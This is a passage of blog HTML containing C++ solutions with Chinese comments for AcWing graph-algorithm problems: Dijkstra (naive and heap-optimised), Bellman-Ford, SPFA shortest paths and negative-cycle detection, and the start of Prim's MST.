class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!st[j] &amp;&amp; (t == <span class="number">-1</span> || dist[t] &gt; dist[j]))     <span class="comment">//选择没有访问且距离最短的下一点</span></span><br><span class="line">        t = j;</span><br><span class="line">    &#125;</span><br><span class="line">    st[t] = <span class="literal">true</span>;       <span class="comment">//设置为已访问</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">      dist[j] = <span class="built_in">min</span>(dist[j], dist[t] + g[t][j]);   <span class="comment">//更新与t有关点的最短距离</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dist[n] == <span class="number">0x3f3f3f3f</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">//如果第n个点路径为无穷大即不存在最低路径</span></span><br><span class="line">  <span class="keyword">return</span> dist[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">  <span class="built_in">memset</span>(g, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> g);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">    <span class="comment">//自环不会影响Dijkstra</span></span><br><span class="line">    g[a][b] = <span class="built_in">min</span>(g[a][b], c);  <span class="comment">//重边的话选择最短边</span></span><br><span class="line">  &#125;</span><br><span class="line">  cout &lt;&lt; <span class="built_in">Dijkstra</span>() &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AcWing-850-Dijkstra求最短路-II"><a href="#AcWing-850-Dijkstra求最短路-II" class="headerlink" title="AcWing 850. Dijkstra求最短路 II"></a>AcWing 850. Dijkstra求最短路 II</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240803170244781.png" alt="image-20240803170244781"></p><p><a href="https://www.acwing.com/solution/content/6554/">AcWing 850. 朴素Dijkstra与堆优化Dijkstra总结 - AcWing</a></p><p>使用优先队列模拟堆来实现距离的排序，同时再出队时遍历从该点出发的边实现更新最短距离值。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; PII;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">150010</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 稀疏图用邻接表来存</span></span><br><span class="line"><span class="type">int</span> h[N], e[N], ne[N], idx;</span><br><span class="line"><span class="type">int</span> w[N]; <span class="comment">// 用来存权重</span></span><br><span class="line"><span class="type">int</span> dist[N];</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line">  e[idx] = b;     <span class="comment">//存终点</span></span><br><span class="line">  ne[idx] = h[a]; <span class="comment">//存上一条边索引</span></span><br><span class="line">  w[idx] = c;     <span class="comment">//存权重</span></span><br><span class="line">  h[a] = idx++;   <span class="comment">//存下标</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dijkstra</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">  dist[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  priority_queue&lt;PII, vector&lt;PII&gt;, greater&lt;PII&gt;&gt; heap;</span><br><span class="line">  heap.<span class="built_in">push</span>(&#123;<span class="number">0</span>, <span class="number">1</span>&#125;); <span class="comment">// 0表示距离，1表示节点,且位置不能变，因为优先队列排序方式</span></span><br><span class="line">  <span class="keyword">while</span> (heap.<span class="built_in">size</span>()) &#123;</span><br><span class="line">    <span class="keyword">auto</span> t = heap.<span class="built_in">top</span>();</span><br><span class="line">    heap.<span class="built_in">pop</span>();</span><br><span class="line">    <span class="type">int</span> distance = t.first, node = t.second;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (st[node])</span><br><span class="line">      <span class="keyword">continue</span>; <span class="comment">// 如果节点被访问过，则跳过</span></span><br><span class="line">    st[node] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = h[node]; i != <span class="number">-1</span>; i = ne[i]) &#123; <span class="comment">//遍历从该节点出发，所有边</span></span><br><span class="line">      <span class="type">int</span> j = e[i];</span><br><span class="line">      <span class="keyword">if</span> (dist[j] &gt; dist[node] + w[i]) &#123;</span><br><span class="line">        dist[j] = dist[node] + w[i];</span><br><span class="line">        heap.<span class="built_in">push</span>(&#123;dist[j], j&#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (dist[n] == <span class="number">0x3f3f3f3f</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> dist[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="built_in">sizeof</span>(h));</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">    <span class="type">int</span> x, y, c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;x, &amp;y, &amp;c);</span><br><span class="line">    <span class="built_in">add</span>(x, y, c);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  cout &lt;&lt; <span class="built_in">dijkstra</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AcWing-853-有边数限制的最短路"><a href="#AcWing-853-有边数限制的最短路" class="headerlink" title="AcWing 853. 有边数限制的最短路"></a>AcWing 853. 有边数限制的最短路</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240803173343556.png" alt="image-20240803173343556"></p><p><a href="https://www.acwing.com/solution/content/6320/">AcWing 853. 有边数限制的最短路 - AcWing</a>解释了为什么Dijkstra不能使用在含负权的图中</p><p>Bellman - ford 算法是求含负权图的单源最短路径的一种算法，效率较低，代码难度较小。其原理为连续进行松弛，在每次松弛时把每条边都更新一下，若在 n-1 次松弛后还能更新，则说明图中有负环，因此无法得出结果，否则就完成。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">510</span>, M = <span class="number">10010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="type">int</span> w;</span><br><span class="line">&#125; e[M];<span class="comment">//把每个边保存下来即可</span></span><br><span class="line"><span class="type">int</span> dist[N];</span><br><span class="line"><span class="type">int</span> back[N];<span class="comment">//备份数组防止串联</span></span><br><span class="line"><span class="type">int</span> n, m, k;<span class="comment">//k代表最短路径最多包涵k条边</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bellman_ford</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">    dist[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(back, dist, <span class="keyword">sizeof</span> dist);</span><br><span class="line">        <span class="comment">//对于每个点，都需要对每条边进行松弛操作</span></span><br><span class="line">        <span class="comment">//我们需要把每个点的最短距离保存下来，因为bellman_ford算法是迭代的，每次迭代都会更新最短距离</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> a = e[i].a, b = e[i].b, w = e[i].w;</span><br><span class="line">            dist[b] = <span class="built_in">min</span>(dist[b], back[a] + w);        <span class="comment">//更新最短距离</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n, &amp;m, &amp;k);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="type">int</span> a, b, w;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;a, &amp;b, &amp;w);</span><br><span class="line">        e[i] = &#123;a, b, w&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">bellman_ford</span>();</span><br><span class="line">    <span class="comment">//避免距离为-1的情况</span></span><br><span class="line">    <span class="keyword">if</span>(dist[n]&gt;<span class="number">0x3f3f3f3f</span>/<span class="number">2</span>) <span class="comment">//若最后一条边边权为负值，则距离可能小于0x3f3f3f3f</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;impossible&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,dist[n]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AcWing-851-spfa求最短路"><a href="#AcWing-851-spfa求最短路" class="headerlink" title="AcWing 851. spfa求最短路"></a>AcWing 851. spfa求最短路</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240803182252830.png" alt="image-20240803182252830"></p><p><a href="https://www.acwing.com/solution/content/9306/">AcWing 851. SPFA算法 - AcWing</a>包含了算法的比较</p><p>SPFA算法和BFS算法差不多</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> h[N], w[N], e[N], ne[N], idx;</span><br><span class="line"><span class="type">int</span> dist[N];</span><br><span class="line"><span class="type">bool</span> st[N];     <span class="comment">// st数组的作用：判断当前的点是否已经加入到队列当中了</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span></span>&#123;</span><br><span class="line">    e[idx] = b;</span><br><span class="line">    ne[idx] = h[a];</span><br><span class="line">    w[idx] = c;</span><br><span class="line">    h[a] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">spfa</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="number">1</span>);</span><br><span class="line">    dist[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        st[t] = <span class="literal">false</span>;      <span class="comment">//出队操作</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = h[t]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> j = e[i];</span><br><span class="line">            <span class="keyword">if</span>(dist[j] &gt; dist[t] + w[i])</span><br><span class="line">            &#123;</span><br><span class="line">                dist[j] = dist[t] + w[i];</span><br><span class="line">                <span class="keyword">if</span>(!st[j])  <span class="comment">///当前已经加入队列的结点，无需再次加入队列</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        st[j] = <span class="literal">true</span>;</span><br><span class="line">                        q.<span class="built_in">push</span>(j);</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dist[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br><span class="line">    <span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">        <span class="type">int</span> a, b, w;</span><br><span class="line">        cin &gt;&gt; a &gt;&gt; b &gt;&gt; w;</span><br><span class="line">        <span class="built_in">add</span>(a, b, w);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">spfa</span>();</span><br><span class="line">    <span class="keyword">if</span>(dist[n] == <span class="number">0x3f3f3f3f</span> )<span class="comment">//如果到n点的距离是无穷，则不能到达,因为spfa只遍历相连的边，而Bellman_ford遍历所有边 </span></span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;impossible&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> cout &lt;&lt; dist[n];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="AcWing-852-spfa判断负环"><a href="#AcWing-852-spfa判断负环" class="headerlink" title="AcWing 852. spfa判断负环"></a>AcWing 852. spfa判断负环</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240803184013449.png" alt="image-20240803184013449"></p><p><a href="https://www.acwing.com/solution/content/6336/">AcWing 852. spfa判断负环 - AcWing</a></p><p>统计当前每个点的最短路中所包含的边数，如果某点的最短路所包含的边数大于等于n，则也说明存在环</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2e3</span> + <span class="number">10</span>, M = <span class="number">1e4</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> h[N], e[M], ne[M], w[M], idx;</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"><span class="type">int</span> dist[N];</span><br><span class="line"><span class="type">int</span> cnt[N]; <span class="comment">// cnt[x] 表示 当前从1-x的最短路的边数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line">  e[idx] = b;</span><br><span class="line">  ne[idx] = h[a];</span><br><span class="line">  w[idx] = c;</span><br><span class="line">  h[a] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">spfa</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//不用初始化dist，因为我们计算的是是否存在负环，根据的是节点数</span></span><br><span class="line">  queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;    <span class="comment">//所有节点入队，因为可能是非连通图</span></span><br><span class="line">    q.<span class="built_in">push</span>(i);</span><br><span class="line">    st[i] = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (q.<span class="built_in">size</span>()) &#123;</span><br><span class="line">    <span class="type">int</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">    q.<span class="built_in">pop</span>();</span><br><span class="line">    st[t] = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = h[t]; i != <span class="number">-1</span>; i = ne[i]) &#123;</span><br><span class="line">      <span class="type">int</span> j = e[i];</span><br><span class="line">      <span class="keyword">if</span> (dist[j] &gt; dist[t] + w[i]) &#123;</span><br><span class="line">        dist[j] = dist[t] + w[i];</span><br><span class="line">        cnt[j] = cnt[t] + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 如果边数超过节点数，说明存在负环</span></span><br><span class="line">        <span class="keyword">if</span> (cnt[j] &gt;= n)</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">         <span class="comment">// 如果节点 j 不在队列中，则将其入队</span></span><br><span class="line">        <span class="keyword">if</span> (!st[j]) &#123;</span><br><span class="line">          q.<span class="built_in">push</span>(j);</span><br><span class="line">          st[j] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br><span class="line">  cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">    <span class="type">int</span> a, b, w;</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b &gt;&gt; w;</span><br><span class="line">    <span class="built_in">add</span>(a, b, w);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">spfa</span>())</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Yes&quot;</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;No&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最小生成树</p><ul><li>普利姆算法（Prim）<ul><li>朴素版Prim    O(n^2)                 稠密图</li><li>堆优化版Prim    O(mlogn)</li></ul></li><li>克鲁斯卡尔算法（Kruskal）       O(mlogm)       稀疏图</li></ul><p>二分图</p><ul><li>染色法    O(n+m)</li><li>匈牙利算法        O(mn)，实际运行时间很小</li></ul><h3 id="AcWing858-Prim算法求最小生成树"><a href="#AcWing858-Prim算法求最小生成树" class="headerlink" title="AcWing858. Prim算法求最小生成树"></a>AcWing858. Prim算法求最小生成树</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240804220248596.png" alt="image-20240804220248596"></p><p>Prem算法：我们从其中一个点出发，遍历该点所有边，找到最小权值的边，然后加入集合，更新该边另一顶点引出的边（使从该边引出的节点可达）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> 